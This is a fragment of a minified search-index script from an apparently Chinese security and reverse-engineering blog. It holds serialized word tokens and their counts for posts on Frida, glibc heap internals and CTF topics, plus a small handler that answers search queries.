,\"15\":3,\"19\":4,\"44\":2,\"46\":1}}],[\"fun\",{\"1\":{\"15\":2}}],[\"f\",{\"1\":{\"6\":2,\"19\":2,\"70\":3,\"71\":3,\"79\":2,\"85\":4}}],[\"fruit\",{\"1\":{\"82\":1}}],[\"from\",{\"1\":{\"70\":1,\"71\":1,\"86\":1}}],[\"front\",{\"1\":{\"0\":1}}],[\"free让整个链表陷入循环\",{\"1\":{\"60\":1}}],[\"free的\",{\"1\":{\"59\":1}}],[\"free函数\",{\"1\":{\"56\":1}}],[\"free\",{\"0\":{\"56\":1},\"1\":{\"50\":1,\"60\":5,\"63\":5}}],[\"free后\",{\"1\":{\"28\":1}}],[\"free后打印出main\",{\"1\":{\"27\":1}}],[\"frida的反调试\",{\"0\":{\"16\":1}}],[\"frida的基本使用\",{\"0\":{\"1\":1}}],[\"frida\",{\"1\":{\"1\":1,\"3\":1,\"6\":2,\"19\":7,\"21\":1}}],[\"ignore\",{\"1\":{\"79\":1}}],[\"it\",{\"1\":{\"60\":1,\"63\":5}}],[\"its\",{\"1\":{\"19\":1,\"21\":1,\"60\":1,\"84\":1}}],[\"idc\",{\"1\":{\"85\":2,\"91\":2}}],[\"idx\",{\"1\":{\"56\":1,\"60\":7,\"63\":6}}],[\"id=socket\",{\"1\":{\"19\":1}}],[\"i这个是emo\",{\"1\":{\"35\":1}}],[\"i<methods\",{\"1\":{\"14\":2}}],[\"i<overlength\",{\"1\":{\"11\":1}}],[\"ifs=\",{\"1\":{\"82\":1}}],[\"ifs变量\",{\"0\":{\"80\":1}}],[\"ifs\",{\"0\":{\"81\":1},\"1\":{\"78\":1,\"81\":3}}],[\"if\",{\"1\":{\"14\":2,\"19\":1,\"33\":2,\"39\":2,\"60\":7,\"63\":6,\"65\":6,\"66\":2,\"78\":1,\"79\":1,\"84\":1,\"89\":1,\"90\":1,\"91\":1}}],[\"important\",{\"1\":{\"29\":1}}],[\"import\",{\"1\":{\"13\":1,\"70\":1,\"71\":1,\"78\":1,\"85\":1,\"86\":1,\"91\":1}}],[\"implementation=function\",{\"1\":{\"9\":1,\"11\":2,\"12\":1}}],[\"implementations\",{\"1\":{\"9\":1,\"10\":1}}],[\"i\",{\"1\":{\"11\":1,\"14\":3,\"19\":3,\"35\":7,\"60\":1,\"70\":12,\"71\":8,\"78\":2,\"79\":1,\"89\":4,\"91\":3,\"92\":11}}],[\"i++\",{\"1\":{\"11\":1,\"14\":2,\"19\":1,\"92\":1}}],[\"i=0\",{\"1\":{\"11\":1,\"14\":2}}],[\"input\",{\"1\":{\"78\":1,\"89\":1,\"90\":2,\"91\":1}}],[\"init\",{\"1\":{\"70\":1,\"71\":1,\"79\":1,\"89\":4}}],[\"invalid\",{\"1\":{\"60\":2}}],[\"index知道我们要绑定函数的名字\",{\"1\":{\"46\":1}}],[\"index\",{\"0\":{\"46\":1},\"1\":{\"35\":1,\"45\":1,\"46\":2,\"56\":1,\"60\":2,\"70\":11,\"71\":11}}],[\"indexof\",{\"1\":{\"14\":2,\"19\":1}}],[\"include<stdio\",{\"1\":{\"85\":1}}],[\"include<stdlib\",{\"1\":{\"33\":1}}],[\"include\",{\"1\":{\"33\":1,\"88\":1,\"92\":1}}],[\"instrumentation\",{\"1\":{\"19\":1}}],[\"inetcache\",{\"1\":{\"19\":1}}],[\"interpreter\",{\"1\":{\"77\":1}}],[\"interp那么就会将ld找到\",{\"1\":{\"75\":1}}],[\"interactive\",{\"1\":{\"70\":1,\"71\":1,\"86\":1}}],[\"interceptor\",{\"1\":{\"15\":1}}],[\"int64\",{\"1\":{\"46\":1,\"89\":2}}],[\"int类型\",{\"1\":{\"35\":1}}],[\"int\",{\"1\":{\"11\":5,\"13\":3,\"33\":4,\"35\":3,\"46\":1,\"56\":1,\"57\":1,\"60\":2,\"84\":1,\"85\":3,\"88\":2,\"89\":2,\"92\":8}}],[\"info高位3字节\",{\"1\":{\"46\":1}}],[\"information\",{\"1\":{\"19\":1}}],[\"info\",{\"1\":{\"1\":1,\"19\":1,\"46\":6}}],[\"in\",{\"1\":{\"0\":1,\"63\":3,\"65\":1,\"70\":3,\"71\":2,\"78\":2,\"82\":1}}],[\"isoc99\",{\"1\":{\"85\":2}}],[\"isused被设置为0\",{\"1\":{\"36\":1}}],[\"isused来判断是否存在的\",{\"1\":{\"36\":1}}],[\"isused\",{\"1\":{\"35\":1}}],[\"is\",{\"1\":{\"0\":1,\"19\":1,\"21\":1,\"29\":3,\"60\":2,\"85\":2}}],[\"break\",{\"1\":{\"90\":1,\"92\":5}}],[\"brk函数申请\",{\"1\":{\"51\":1}}],[\"brk函数\",{\"1\":{\"48\":1}}],[\"brk\",{\"1\":{\"48\":1}}],[\"banana\",{\"1\":{\"82\":2}}],[\"base\",{\"1\":{\"15\":2}}],[\"blacklist\",{\"1\":{\"78\":2}}],[\"bloghome\",{\"1\":{\"0\":1}}],[\"blog\",{\"0\":{\"0\":1},\"1\":{\"0\":2}}],[\"but\",{\"1\":{\"63\":1}}],[\"builtin\",{\"1\":{\"39\":2,\"60\":4,\"65\":1,\"66\":1}}],[\"be\",{\"1\":{\"84\":1}}],[\"before\",{\"1\":{\"63\":1}}],[\"below\",{\"1\":{\"60\":1}}],[\"been\",{\"1\":{\"60\":1}}],[\"bk获取下一个chunk\",{\"1\":{\"65\":1}}],[\"bk去获取前面一个chunk的fd和后面一个chunk的bk\",{\"1\":{\"39\":1}}],[\"bk\",{\"1\":{\"38\":2,\"39\":4,\"50\":2,\"65\":5,\"66\":6,\"70\":3,\"71\":3}}],[\"byte\",{\"1\":{\"89\":1,\"91\":1}}],[\"bytes=\",{\"1\":{\"79\":1}}],[\"byref\",{\"1\":{\"84\":1,\"85\":1,\"89\":4}}],[\"by\",{\"0\":{\"66\":1},\"1\":{\"37\":1}}],[\"bin先被消耗掉\",{\"1\":{\"70\":1}}],[\"bin大小的chunk申请下来\",{\"1\":{\"69\":1}}],[\"bin是一个双向链表\",{\"1\":{\"69\":1}}],[\"bin单个区间大小的链表长度最长为7个\",{\"1\":{\"69\":1}}],[\"bin的位置填满\",{\"1\":{\"70\":1}}],[\"bin的大小\",{\"1\":{\"69\":1}}],[\"bin的范围为\",{\"1\":{\"69\":1}}],[\"bin的链表\",{\"1\":{\"59\":1}}],[\"bin的chunk和top\",{\"1\":{\"70\":1}}],[\"bin的chunk\",{\"1\":{\"50\":1}}],[\"bin合并free\",{\"1\":{\"51\":1}}],[\"bin无和是bin则遍历unsorted\",{\"1\":{\"51\":1}}],[\"bin找\",{\"1\":{\"51\":2}}],[\"bin里面\",{\"1\":{\"30\":1}}],[\"bin\",{\"0\":{\"55\":1},\"1\":{\"28\":1,\"60\":1,\"70\":1}}],[\"bin放满了\",{\"1\":{\"28\":1}}],[\"bin中的chunk\",{\"1\":{\"70\":1}}],[\"bin中第一个chunk的bk和最后一个chunk的fd都指向main\",{\"1\":{\"69\":1}}],[\"bin中\",{\"1\":{\"27\":1}}],[\"bins或者smallbin找\",{\"1\":{\"51\":1}}],[\"bins\",{\"1\":{\"27\":1,\"29\":2,\"30\":1,\"63\":1}}],[\"bins中\",{\"1\":{\"27\":1}}],[\"binary\",{\"1\":{\"24\":1}}],[\"b=456\",{\"1\":{\"9\":1}}],[\"b\",{\"1\":{\"9\":3,\"11\":1,\"70\":15,\"71\":15,\"79\":1,\"86\":3}}],[\"bootlin\",{\"1\":{\"52\":1}}],[\"book123\",{\"1\":{\"1\":1}}],[\"both\",{\"1\":{\"0\":1}}],[\"switch\",{\"1\":{\"92\":1}}],[\"sub\",{\"1\":{\"89\":1,\"90\":1}}],[\"succeeds\",{\"1\":{\"63\":1}}],[\"sighandler\",{\"1\":{\"89\":1,\"91\":1}}],[\"signal\",{\"1\":{\"89\":1,\"91\":1}}],[\"sigsetjmp\",{\"1\":{\"89\":1,\"91\":1}}],[\"siscn\",{\"0\":{\"84\":1}}],[\"size=0xa8\",{\"1\":{\"70\":1,\"71\":1}}],[\"size来定的\",{\"1\":{\"66\":1}}],[\"size来存东西\",{\"1\":{\"32\":1}}],[\"size是否等于这个size\",{\"1\":{\"65\":1}}],[\"size是否与p的大小相同\",{\"1\":{\"39\":1}}],[\"size检查\",{\"1\":{\"60\":1}}],[\"size+size\",{\"1\":{\"60\":1}}],[\"size+size+fd+data\",{\"1\":{\"50\":1}}],[\"size的空间\",{\"1\":{\"51\":1}}],[\"size有且仅当\",{\"1\":{\"50\":1}}],[\"size\",{\"1\":{\"29\":1,\"33\":7,\"35\":1,\"36\":1,\"39\":3,\"50\":3,\"56\":1,\"60\":13,\"63\":2,\"65\":3,\"66\":8,\"70\":19,\"71\":19}}],[\"space\",{\"1\":{\"79\":1}}],[\"spawned\",{\"1\":{\"19\":1}}],[\"spawn\",{\"1\":{\"19\":1}}],[\"screen\",{\"1\":{\"79\":1}}],[\"scache中查找文件\",{\"1\":{\"74\":1}}],[\"scanf\",{\"1\":{\"33\":1,\"85\":3}}],[\"shell\",{\"1\":{\"78\":1,\"81\":4}}],[\"show\",{\"1\":{\"68\":1,\"70\":1,\"71\":1}}],[\"show函数\",{\"1\":{\"68\":1}}],[\"should\",{\"1\":{\"0\":1,\"84\":1}}],[\"small\",{\"1\":{\"65\":1}}],[\"smallbin\",{\"1\":{\"65\":1}}],[\"s\",{\"1\":{\"63\":2,\"79\":1,\"84\":1,\"86\":1}}],[\"same\",{\"1\":{\"60\":1}}],[\"sym\",{\"1\":{\"46\":2}}],[\"system\",{\"1\":{\"12\":1,\"13\":2,\"19\":1,\"60\":1,\"78\":1,\"84\":1}}],[\"sz然后必须<=av\",{\"1\":{\"60\":1}}],[\"sz\",{\"1\":{\"32\":1,\"60\":3}}],[\"so的man手册\",{\"1\":{\"73\":1}}],[\"source\",{\"1\":{\"52\":1}}],[\"so中\",{\"1\":{\"27\":1}}],[\"so中的函数\",{\"0\":{\"15\":1}}],[\"so\",{\"1\":{\"15\":5,\"19\":1,\"48\":1,\"63\":1,\"73\":1,\"74\":1,\"76\":1,\"77\":3}}],[\"so名称\",{\"1\":{\"15\":1}}],[\"start\",{\"1\":{\"88\":3}}],[\"stack\",{\"1\":{\"84\":1}}],[\"static\",{\"1\":{\"11\":4,\"12\":1,\"13\":2,\"29\":1,\"65\":1}}],[\"st\",{\"1\":{\"35\":4,\"46\":5}}],[\"st数据看起来是关键\",{\"1\":{\"35\":1}}],[\"stdin\",{\"1\":{\"33\":1}}],[\"strcpy\",{\"1\":{\"90\":1}}],[\"stru\",{\"1\":{\"89\":3,\"90\":2}}],[\"struct管理tcache\",{\"1\":{\"59\":1}}],[\"struct\",{\"1\":{\"29\":8,\"35\":1,\"46\":1,\"50\":1}}],[\"str\",{\"1\":{\"11\":2,\"70\":6,\"71\":6}}],[\"string\",{\"1\":{\"11\":4,\"12\":1,\"13\":4,\"35\":2}}],[\"student\",{\"1\":{\"9\":2,\"11\":5,\"12\":4,\"13\":6}}],[\"student=java\",{\"1\":{\"9\":1,\"11\":2,\"12\":1,\"13\":1}}],[\"sem\",{\"1\":{\"89\":5,\"90\":4}}],[\"search\",{\"1\":{\"79\":1}}],[\"send\",{\"1\":{\"70\":1,\"71\":1}}],[\"sendline\",{\"1\":{\"70\":7,\"71\":7,\"86\":1}}],[\"self\",{\"1\":{\"70\":23,\"71\":23}}],[\"server\",{\"1\":{\"21\":1}}],[\"see\",{\"1\":{\"0\":1,\"60\":1,\"63\":1}}],[\"setimmediate\",{\"1\":{\"9\":1,\"19\":1}}],[\"set\",{\"1\":{\"0\":1,\"60\":1,\"70\":2,\"71\":2,\"77\":2}}],[\"your\",{\"1\":{\"70\":1,\"71\":1,\"77\":1}}],[\"you\",{\"1\":{\"0\":1}}],[\"txt\",{\"1\":{\"79\":4}}],[\"t总长度\",{\"1\":{\"70\":1,\"71\":1}}],[\"tpatload长度\",{\"1\":{\"70\":1,\"71\":1}}],[\"tprev\",{\"1\":{\"70\":1,\"71\":1}}],[\"tbk\",{\"1\":{\"70\":1,\"71\":1}}],[\"tfd\",{\"1\":{\"70\":1,\"71\":1}}],[\"tsize\",{\"1\":{\"70\":1,\"71\":1}}],[\"tsl\",{\"0\":{\"53\":1}}],[\"tmp\",{\"1\":{\"63\":6}}],[\"t>\",{\"1\":{\"63\":1}}],[\"trust\",{\"1\":{\"63\":1}}],[\"true\",{\"1\":{\"0\":1,\"78\":1}}],[\"t\",{\"1\":{\"63\":3,\"88\":5,\"89\":5,\"91\":1}}],[\"tencent\",{\"1\":{\"38\":1}}],[\"test2\",{\"1\":{\"11\":1}}],[\"test\",{\"1\":{\"11\":10,\"12\":7,\"19\":1,\"60\":1,\"63\":1,\"92\":1}}],[\"type\",{\"1\":{\"35\":1,\"44\":2,\"46\":1}}],[\"typedef\",{\"1\":{\"29\":2}}],[\"tail命令\",{\"1\":{\"79\":1}}],[\"take\",{\"1\":{\"33\":1}}],[\"target\",{\"1\":{\"19\":1}}],[\"time\",{\"1\":{\"29\":1}}],[\"tc\",{\"1\":{\"63\":6}}],[\"tcache在libc2\",{\"1\":{\"63\":1}}],[\"tcache利用\",{\"0\":{\"61\":1}}],[\"tcachebin\",{\"1\":{\"51\":1}}],[\"tcache位于heap最前端\",{\"1\":{\"30\":1}}],[\"tcache\",{\"0\":{\"59\":1,\"63\":1},\"1\":{\"29\":12,\"63\":13,\"69\":2,\"70\":1}}],[\"tcache缓存的是非large\",{\"1\":{\"28\":1}}],[\"tcache机制\",{\"1\":{\"28\":1}}],[\"tcahe机制\",{\"0\":{\"28\":1}}],[\"tcahe机制+泄露libc地址\",{\"0\":{\"26\":1}}],[\"tcp\",{\"1\":{\"2\":2}}],[\"that\",{\"1\":{\"29\":1,\"60\":3}}],[\"thread\",{\"1\":{\"19\":1,\"29\":3,\"88\":4}}],[\"these\",{\"1\":{\"29\":1}}],[\"there\",{\"1\":{\"29\":1}}],[\"the\",{\"1\":{\"0\":1,\"19\":1,\"21\":1,\"29\":2,\"33\":1,\"60\":10,\"63\":1,\"84\":1,\"85\":2,\"86\":1}}],[\"this\",{\"1\":{\"0\":2,\"9\":1,\"10\":1,\"11\":3,\"12\":1,\"13\":4,\"29\":1,\"60\":1,\"63\":1}}],[\"top\",{\"1\":{\"50\":1,\"60\":2}}],[\"toolkit\",{\"1\":{\"19\":1}}],[\"to\",{\"1\":{\"0\":1,\"19\":3,\"21\":3,\"60\":3,\"63\":1}}],[\"a3\",{\"1\":{\"89\":1}}],[\"a2\",{\"1\":{\"89\":1}}],[\"a1\",{\"1\":{\"89\":1,\"90\":1}}],[\"amd64\",{\"1\":{\"84\":1}}],[\"abort\",{\"1\":{\"63\":1}}],[\"aborting\",{\"1\":{\"63\":1}}],[\"about\",{\"1\":{\"19\":1}}],[\"anna\",{\"1\":{\"86\":1}}],[\"an\",{\"1\":{\"63\":1}}],[\"andfd\",{\"1\":{\"65\":1}}],[\"android\",{\"0\":{\"93\":1},\"1\":{\"1\":1,\"19\":2,\"21\":1}}],[\"and\",{\"1\":{\"0\":1,\"29\":1,\"60\":2,\"66\":1}}],[\"actual\",{\"1\":{\"60\":1}}],[\"also\",{\"1\":{\"63\":1}}],[\"already\",{\"1\":{\"60\":1,\"63\":1}}],[\"alloced\",{\"1\":{\"50\":2}}],[\"as\",{\"1\":{\"60\":1}}],[\"assert\",{\"1\":{\"60\":1}}],[\"av\",{\"1\":{\"38\":1,\"56\":1,\"60\":6,\"65\":1}}],[\"after\",{\"1\":{\"27\":1,\"60\":1}}],[\"attr\",{\"1\":{\"88\":4}}],[\"attach\",{\"1\":{\"15\":1,\"19\":1,\"21\":1}}],[\"atomically\",{\"1\":{\"60\":1}}],[\"at\",{\"1\":{\"19\":1,\"60\":6,\"63\":1,\"79\":1}}],[\"arrow\",{\"1\":{\"79\":1}}],[\"art\",{\"1\":{\"78\":2}}],[\"arch\",{\"1\":{\"54\":1,\"84\":1}}],[\"arean+88的地址了\",{\"1\":{\"72\":1}}],[\"are\",{\"1\":{\"29\":1,\"60\":2}}],[\"arena+48\",{\"1\":{\"69\":1}}],[\"arena+88的位置\",{\"1\":{\"69\":1}}],[\"arena+88\",{\"1\":{\"30\":1,\"69\":1}}],[\"arena然后双向链表\",{\"1\":{\"64\":1}}],[\"arena的地址\",{\"1\":{\"30\":1}}],[\"arena的实际地址\",{\"1\":{\"27\":1}}],[\"arena中\",{\"1\":{\"27\":1}}],[\"arm64\",{\"1\":{\"19\":1}}],[\"argv\",{\"1\":{\"85\":2}}],[\"argc\",{\"1\":{\"85\":2}}],[\"arg参数作为参数这里plt\",{\"1\":{\"44\":1}}],[\"arg\",{\"1\":{\"44\":4,\"88\":2}}],[\"args\",{\"1\":{\"12\":1,\"13\":1,\"15\":1}}],[\"arguments\",{\"1\":{\"11\":2,\"19\":1}}],[\"agentalbrazee\",{\"1\":{\"84\":1}}],[\"age\",{\"1\":{\"12\":1,\"13\":4}}],[\"apple\",{\"1\":{\"82\":2}}],[\"apply\",{\"1\":{\"11\":1}}],[\"appdata\",{\"1\":{\"19\":1}}],[\"apk\",{\"1\":{\"6\":2}}],[\"a+b\",{\"1\":{\"11\":1}}],[\"a=123\",{\"1\":{\"9\":1,\"11\":1}}],[\"add函数\",{\"1\":{\"68\":1}}],[\"adding\",{\"1\":{\"60\":1}}],[\"addemo函数内部\",{\"1\":{\"35\":1}}],[\"addr就是取fs放在什么地方\",{\"1\":{\"54\":1}}],[\"addr\",{\"1\":{\"15\":1,\"25\":1,\"54\":1,\"77\":1}}],[\"addr=module\",{\"1\":{\"15\":1}}],[\"add\",{\"1\":{\"9\":2,\"11\":1,\"15\":2,\"60\":1,\"68\":1,\"70\":3,\"71\":3}}],[\"add方法\",{\"1\":{\"9\":1}}],[\"adb\",{\"1\":{\"2\":1}}],[\"a\",{\"1\":{\"0\":1,\"9\":3,\"11\":4,\"12\":3,\"19\":1,\"60\":2,\"63\":3,\"70\":1,\"71\":1,\"85\":5,\"86\":1}}]],\"serializationVersion\":2}}")).map(([e,t])=>[e,zt(t,{fields:["h","t","c"],storeFields:["h","t","c"]})]));self.onmessage=({data:{type:e="all",query:t,locale:s,options:n}})=>{e==="suggest"?self.postMessage(st(t,v[s],n)):e==="search"?self.postMessage(et(t,v[s],n)):self.postMessage({suggestions:st(t,v[s],n),results:et(t,v[s],n)})};
//# sourceMappingURL=index.js.map
